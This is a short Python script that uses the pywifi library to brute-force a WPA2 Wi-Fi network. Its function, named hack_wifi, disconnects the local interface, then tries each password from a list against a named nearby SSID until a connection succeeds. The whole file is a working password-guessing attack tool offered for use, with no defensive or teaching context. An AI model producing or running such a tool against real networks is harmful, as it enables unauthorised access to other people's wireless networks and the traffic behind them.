import pywifi,time
from pywifi import const
from datetime import datetime

PasswordList = ['88888888','qqqqqqqqqq']# the list of passwords u want to try
def hack_wifi():
    
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    iface.disconnect()
    time.sleep(1)
    assert iface.status() in\
    [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
    


    profile = pywifi.Profile()
    profile.ssid = 'POOPA' # the name of the wifi nearby
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    for password in PasswordList:
        profile.key = password  
        print(password)
        # iface.remove_all_network_profiles()
        tmp_profile = iface.add_network_profile(profile)
        iface.connect(profile)
        time.sleep(1) # in case of having trouble with connecting increase this number up to 30
        if iface.status()==const.IFACE_CONNECTED :
            print('connected...!')
            break


hack_wifi()